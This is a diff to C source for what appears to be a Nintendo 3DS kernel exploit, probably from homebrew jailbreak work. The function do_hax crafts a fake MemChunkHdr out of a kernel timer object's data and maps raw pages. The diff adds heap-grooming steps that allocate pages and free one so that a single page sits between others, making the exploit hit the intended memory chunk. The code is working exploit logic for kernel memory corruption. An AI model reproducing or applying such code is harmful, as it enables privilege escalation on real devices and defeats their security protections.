@@ -129,12 +129,15 @@ static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset
 
 // Executes exploit.
 void do_hax() {
+    u32 tmp;
+
     // Allow threads on core 1.
     aptOpenSession();
     APT_SetAppCpuTimeLimit(30);
     aptCloseSession();
 
     // Create a timer, crafting a fake MemChunkHdr out of its data.
+    // TODO: Do next/prev *need* to be non-zero?
     Handle timer;
     u32 timerAddr;
     svcCreateTimerKAddr(&timer, 0, &timerAddr);
@@ -149,6 +152,11 @@ void do_hax() {
     // Prepare memory details.
     u32 memAddr = __ctru_heap + __ctru_heap_size;
     u32 memSize = PAGE_SIZE * 2;
+
+    // Isolate a single page between others to ensure using the next chunk.
+    svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
+    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
+    svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
 
     // Map the pages.
     map_raw_pages(memAddr, memSize);
@@ -174,8 +182,8 @@ void do_hax() {
     svcCloseHandle(timer);
 
     // Free the allocated pages.
-    u32 tmp;
     svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);
+    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
 }
 
 int main(int argc, char **argv) {
